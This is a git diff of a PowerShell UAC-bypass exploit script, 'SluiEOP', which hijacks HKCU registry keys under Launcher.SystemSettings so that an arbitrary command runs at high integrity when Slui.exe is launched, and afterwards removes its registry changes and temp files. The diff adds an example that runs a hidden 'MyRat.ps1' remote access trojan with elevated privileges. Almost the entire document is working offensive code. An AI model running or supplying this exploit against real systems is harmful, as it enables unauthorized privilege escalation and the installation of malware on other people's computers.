@@ -2,12 +2,12 @@
 .SYNOPSIS
    SluiEOP can be used for privilege escalation or to execute one command with high integrity (admin)
 
-  Author: r00t-3xp10it (SSA RedTeam @2020)
-  Tested Under: Windows 10 - 18363.778
-  EOP Disclosure By: @mattharr0ey
-  Required Dependencies: none
-  Optional Dependencies: none
-  PS Script Dev Version: v1.3
+   Author: r00t-3xp10it (SSA RedTeam @2020)
+   Tested Under: Windows 10 - 18363.778
+   EOP Disclosure By: @mattharr0ey
+   Required Dependencies: none
+   Optional Dependencies: none
+   PS Script Dev Version: v1.3
 
 .DESCRIPTION
    How does Slui UAC bypass work? There is a tool named ChangePK in System32 has a service that opens a window (for you)
@@ -28,6 +28,10 @@
    PS C:\> ./SluiEOP.ps1 "C:\Windows\System32\cmd.exe /c start notepad"
    Execute notepad process with high privileges (SYSTEM)
 
+.EXAMPLE
+   PS C:\> ./SluiEOP.ps1 "powershell -exec bypass -w 1 -File MyRat.ps1"
+   Execute MyRat.ps1 script with high privileges (SYSTEM)
+
 .INPUTS
    None. You cannot pipe objects to SluiEOP.ps1
 
@@ -42,7 +46,6 @@
 #>
 
 
-$IPath = pwd;
 $Command = $Null;
 $param1 = $args[0] # User Inputs [Arguments]
 If(-not($param1) -or $param1 -eq $null){
@@ -51,10 +54,11 @@ If(-not($param1) -or $param1 -eq $null){
    $Command = "$param1"
 }
 
+## Check Vulnerability before continue any further ..
 $CheckVuln = Test-Path -Path "HKCU:\Software\Classes" -EA SilentlyContinue
 If($CheckVuln -eq $True){
 
-   ### Add Entrys to Regedit {powershell}
+   ### Add Entrys to Regedit {using powershell}
    New-Item "HKCU:\Software\Classes\Launcher.SystemSettings" -Force|Out-Null;Start-Sleep -Seconds 1
    Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings" -Name "(default)" -Value 'Open' -Force -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Seconds 1
    New-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shell" -Force|Out-Null;Start-Sleep -Seconds 1
@@ -63,7 +67,7 @@ If($CheckVuln -eq $True){
    Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open" -Name "MuiVerb" -Value "@appresolver.dll,-8501" -Force -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Seconds 1
    New-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open\Command" -Force|Out-Null;Start-Sleep -Seconds 1
 
-   ## The Next Registry entry allow us execute our command under high privileges
+   ## The Next Registry entry allow us to execute our command under high privileges (SYSTEM)
    Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open\Command" -Name "(default)" -Value "$Command" -Force -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Seconds 1
    Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open\Command" -Name "DelegateExecute" -Value '' -Force -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Seconds 1
    New-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shellex" -Force|Out-Null;Start-Sleep -Seconds 1
@@ -72,15 +76,15 @@ If($CheckVuln -eq $True){
    New-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shellex\ContextMenuHandlers\{90AA3A4E-1CBA-4233-B8BB-535773D48449}" -Force|Out-Null;Start-Sleep -Seconds 1
    Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings\shellex\ContextMenuHandlers\{90AA3A4E-1CBA-4233-B8BB-535773D48449}" -Name "(default)" -Value 'Taskband Pin' -Force -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Seconds 1
 
-   ### Start vulnerable process {powershell}
-   Start-Sleep -Seconds 2;start-process "$env:WINDIR\System32\Slui.exe" -Verb runas
+   ### Start vulnerable process {using powershell}
+   Start-Sleep -Seconds 2;Start-Process -Path "$env:WINDIR\System32\Slui.exe" -Verb runas
 
    Start-Sleep -Seconds 1
    ### Revert Regedit to 'DEFAULT' settings after all testings done ..
    Remove-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shell" -Recurse -Force;Start-Sleep -Seconds 1
    Remove-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shellex" -Recurse -Force;Start-Sleep -Seconds 1
    Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings" -Name "(default)" -Value '' -Force
-   Start-Sleep -Seconds 2
+   Start-Sleep -Seconds 2;
 
 }else{
    echo "   ERROR    System Doesn't Seems Vulnerable, Aborting." > $env:TMP\fail.log
@@ -90,5 +94,4 @@ If($CheckVuln -eq $True){
 ## Clean old files/configurations
 If(Test-Path "$env:TMP\fail.log"){Get-Content -Path "$env:TMP\fail.log" -EA SilentlyContinue;Remove-Item -Path "$env:TMP\fail.log" -Force -EA SilentlyContinue}
 If(Test-Path "$env:TMP\SluiEOP.ps1"){Remove-Item -Path "$env:TMP\SluiEOP.ps1" -Force -EA SilentlyContinue}
-
 Exit
